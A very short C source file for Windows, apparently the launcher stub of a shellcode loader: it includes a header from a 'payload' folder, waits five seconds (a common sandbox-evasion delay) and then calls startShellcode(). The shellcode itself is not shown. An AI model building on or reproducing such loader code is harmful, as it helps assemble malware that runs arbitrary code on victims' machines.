#include <windows.h>
#include "../payload/payload.h"

int main() {
    Sleep(5000);
    startShellcode(); 
    return 0;
}